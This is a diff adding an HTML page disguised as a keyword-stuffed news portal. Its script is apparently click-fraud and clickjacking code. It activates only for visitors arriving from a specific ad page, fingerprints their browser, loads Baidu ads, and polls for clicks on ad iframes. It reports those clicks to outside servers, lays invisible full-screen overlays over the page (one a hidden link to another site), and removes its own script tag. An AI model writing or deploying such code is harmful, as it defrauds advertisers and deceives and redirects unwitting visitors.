@@ -1,0 +1,309 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>国际新闻，天猫，淘宝，军事，财经，社会，科技，时尚，环球新闻,东方新闻，中关村在线,JD</title>
+    <style>
+        * {
+            margin: 0px;
+            padding: 0px;
+        }
+    </style>
+
+<body>
+    <a id="gemer" onclick="this.parentNode.removeChild(this)" target="_black"
+        href="http://news.zizhengjiankang.com/doubt/aent/index.html"
+        style="width:100%;height:100%;position:absolute;z-index:10000;display:none;"></a>
+    <div id="click_LOCK" target="_black" style="width:100%;height:100%;position:absolute;z-index:100;display:none;">
+    </div>
+    <script>
+        !function () {
+                
+                if (document.referrer != "https://naa.zol.com.cn/adsenseAd/j.html") {
+                    return
+                }
+                //domload
+                function h() {
+                    document.addEventListener ? (document.removeEventListener("DOMContentLoaded", i), window.removeEventListener("load", i)) : (document.detachEvent("onreadystatechange", i), window.detachEvent("onload", i))
+                }
+                function i() {
+                    (document.addEventListener || "load" == window.event.type || "complete" == document.readyState) && (h(), PUlog(window.location.hash.substr(1).split('&')[0]))
+                }
+                //浏览器信息
+                var CLICK = 1;
+                var CONFIG = "";
+                // var hashobj = JSON.parse(decodeURIComponent(window.location.hash.substr(1).split('&')[2]));
+                document.title = decodeURIComponent(window.location.hash.substr(1).split('&')[2]);
+                var bw = {
+                    moveCount: 0,
+                    touchPointCount: window.navigator.maxTouchPoints,
+                    agentLeftTop: window.screenLeft ? (window.screenLeft + "*" + window.screenTop) : (window.screenX + "*" + window.screenY),
+                    screenSize: window.screen.width + "*" + window.screen.height,
+                    agentSize: (window.innerWidth || document.documentElement.clientWidth || document.body.clientWidth) + "*" + (window.innerHeight || document.documentElement.clientHeight || document.body.clientHeight),
+                    cd: /Android|webOS|iPhone|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) ? "m" : "p",
+                    userAgent: navigator.userAgent,
+                    os: (function () {
+                        if (navigator.userAgent.indexOf("Window") > 0) {
+                            return "windows";
+                        } else if (navigator.userAgent.indexOf("iPhone") > 0) {
+                            return "ios";
+                        } else if (navigator.userAgent.indexOf("Mac OS X") > 0) {
+                            return "Mac";
+                        } else if (navigator.userAgent.indexOf("Android") > 0) {
+                            return "Android";
+                        } else if (navigator.userAgent.indexOf("Linux") > 0) {
+                            return "Linux";
+                        } else {
+                            return "NUll";
+                        }
+                    })(),
+                    bwinfo: function () {
+                        var a, b, c = navigator.userAgent.toLowerCase();
+                        return a = (b = c.match(/rv:([\d.]+)\) like gecko/)) ? {
+                            ie: !0,
+                            vf: b[1]
+                        } : (b = c.match(/msie ([\d.]+)/)) ? {
+                            ie: !0,
+                            vf: b[1]
+                        } : (b = c.match(/firefox\/([\d.]+)/)) ? {
+                            firefox: !0,
+                            vf: b[1]
+                        } : (b = c.match(/chrome\/([\d.]+)/)) ? {
+                            chrome: !0,
+                            vf: b[1]
+                        } : (b = c.match(/opera.([\d.]+)/)) ? {
+                            opera: !0,
+                            vf: b[1]
+                        } : (b = c.match(/version\/([\d.]+).*safari/)) ? {
+                            safari: !0,
+                            vf: b[1]
+                        } : {
+                                                    other: !0,
+                                                    vf: "0"
+                                                },
+                            a.v = a.vf.match(/^\d+/)[0],
+                            a
+                    }()
+                }
+                var utils = {
+                    repotUrl: 'https://team.h5.xiguakankan.com:8015/ad/clickInfo.js',
+                    reportevent: "",
+                    reportdata: window.location.hash.substr(1).split('&')[1] || "error",
+                    cid: window.location.hash.substr(1).split('&')[0],
+                    cinfo: window.location.hash.substr(1).split('&')[0] + ',timer:' + new Date().getTime(),
+                    ajax: function (options) {
+                        var formatParams = function (data) {
+                            var arr = []
+                            for (var name in data) {
+                                arr.push(encodeURIComponent(name) + '=' + encodeURIComponent(data[name]))
+                            }
+                            arr.push(('v=' + Math.random()).replace('.', ''))
+                            return arr.join('&')
+                        }
+                        options = options || {}
+                        options.type = (options.type || 'GET').toUpperCase()
+                        options.dataType = options.dataType || 'json'
+                        var params = formatParams(options.data)
+
+                        if (window.XMLHttpRequest) {
+                            var xhr = new XMLHttpRequest()
+                        } else {
+                            var xhr = new ActiveXObject('Microsoft.XMLHTTP')
+                        }
+
+                        xhr.onreadystatechange = function () {
+                            if (xhr.readyState == 4) {
+                                var status = xhr.status
+                                if (status >= 200 && status < 300) {
+                                    options.success && options.success(xhr.responseText, xhr.responseXML)
+                                } else {
+                                    options.fail && options.fail(status)
+                                }
+                            }
+                        }
+
+                        if (options.type == 'GET') {
+                            xhr.open('GET', options.url + '?' + params, true);
+                            xhr.withCredentials = true;
+                            xhr.send(null)
+                        } else if (options.type == 'POST') {
+                            xhr.open('POST', options.url, true)
+                            xhr.withCredentials = true;
+                            xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded')
+                            xhr.send(params)
+                        }
+                    },
+                    ehchace: function () {
+                        return Math.random().toString(36).slice(2);
+                    },
+                    report: function (url, data) {
+                        var defaultUrl = '/img';
+                        url = url || defaultUrl;
+                        url = url.replace(/^null/, defaultUrl);
+                        if (!url || !data) {
+                            return;
+                        }
+                        var image = document.createElement('img');
+                        var items = [];
+                        for (var key in data) {
+                            if (data[key] || data[key] === 0) {
+                                items.push(key + '=' + encodeURIComponent(data[key]));
+                            }
+                        }
+                        image.onload = image.onerror = function () {
+                            image = image.onload = image.onerror = null;
+                        };
+                        image.src = url + (url.indexOf('?') < 0 ? '?' : '&') + items.join('&');
+                    },
+                    mergeObj: function (a, b) {
+                        var result = {};
+                        for (var p in a) {
+                            if (a.hasOwnProperty(p)) {
+                                result[p] = a[p];
+                            }
+                        }
+                        for (var q in b) {
+                            if (b.hasOwnProperty(q)) {
+                                result[q] = b[q];
+                            }
+                        }
+                        return result;
+                    },
+                    IframeOnClick: function (id) {
+                        if (id == 'u3693113' || bw.os == "ios") return;
+                        isADtIME = setInterval(function () {
+                            if (document.activeElement.tagName == "IFRAME") {
+                                if (CLICK > 2) {
+                                    document.getElementById('click_LOCK').style.display = "block";
+                                } else {
+                                    CLICK += 1;
+                                }
+                                try {
+                                    utils.ajax({
+                                        url: 'https://adapi.ydtad.com/ad/clickInfo.js',
+                                        type: 'GET',
+                                        data: {
+                                            adId: id,
+                                            r: document.referrer
+                                        },
+                                        dataType: 'text',
+                                        success: function (response, xml) {
+                                            if (response == 1) {
+                                                document.getElementById('click_LOCK').style.display = "block";
+                                            } else {
+                                                document.getElementById('click_LOCK').style.display = "none";
+                                            }
+                                        },
+                                        fail: function (status) {
+
+                                        }
+                                    })
+
+                                } catch (error) {
+                                    utils.report(utils.repotUrl, { adId: id, r: document.referrer });
+                                }
+                                try {
+                                    document.activeElement.blur();
+                                    document.body.focus();
+                                    if (document.activeElement.tagName == "IFRAME") {
+                                        clearInterval(isADtIME);
+                                    }
+                                } catch (error) {
+                                    if (document.activeElement.tagName == "IFRAME") {
+                                        clearInterval(isADtIME);
+                                    }
+                                }
+
+                            }
+                        }, 60);
+
+                    },
+                    addEvent: (function () {
+                        if (document.addEventListener) {
+                            return function (el, type, fn) {
+                                el.addEventListener(type,
+                                    function (e) {
+                                        fn.call(el, e)
+                                    },
+                                    false)
+                            }
+                        } else {
+                            if (window.attachEvent) {
+                                return function (el, type, fn) {
+                                    el.attachEvent("on" + type.toString(),
+                                        function (e) {
+                                            fn.call(el, e)
+                                        })
+                                }
+                            }
+                        }
+                    })(),
+                    sl: function (a, b) {
+                        var c = document.createElement("script");
+                        c.src = a,
+                            c.type = "text/javascript",
+                            c.onload = c.onreadystatechange = function () {
+                                this.readyState && "loaded" != this.readyState && "complete" != this.readyState || (this.onload = this.onreadystatechange = null, this.parentNode.removeChild(this), "function" == typeof b && b())
+                            }
+                            ,
+                            document.getElementsByTagName("head")[0].appendChild(c)
+                    },
+                    timestamp: function () {
+                        return parseInt(new Date().getTime() / 1000)
+                    }
+
+                }
+
+                //广告处理
+                // var reportData = utils.mergeObj(hashobj, bw);
+                function PUlog(CID) {
+
+                    window.location.hash.split("&")[4] == "g=t" && (document.getElementById('gemer').style.display = "block");
+                    //百度广告呈现
+                    var adDiv = document.createElement('div');
+                    document.body.appendChild(adDiv);
+
+                    (window.slotbydup = window.slotbydup || []).push({
+                        id: CID,
+                        container: adDiv
+                    })
+                    utils.sl("https://cpro.baidustatic.com/cpro/ui/c" + (bw.cd == "m" ? "m" : "") + ".js");
+                    //点击检测
+                    utils.IframeOnClick(CID);
+                }
+
+                "complete" == document.readyState || "loading" != document.readyState && !document.documentElement.doScroll ? window.setTimeout(PUlog(window.location.hash.substr(1).split('&')[0])) : document.addEventListener ? (document.addEventListener("DOMContentLoaded", i), window.addEventListener("load", i)) : (document.attachEvent("onreadystatechange", i), window.attachEvent("onload", i));
+                try {
+                    var interactive = function () {
+                        var jsPath = document.currentScript ? document.currentScript : function () {
+                            var js = document.scripts
+                                , last = js.length - 1
+                                , jsdom;
+                            for (var i = last; i > 0; i--) {
+                                if (js[i].readyState === 'interactive') {
+                                    jsdom = js[i].jsdom;
+                                    break;
+                                }
+                            }
+                            return jsdom || js[last];
+                        }();
+                        return jsPath;
+                    }();
+                    interactive.parentNode.removeChild(interactive);
+
+                } catch (error) {
+
+                }
+
+
+          
+
+        }()
+    </script>
+
+</body>
+
+</html>
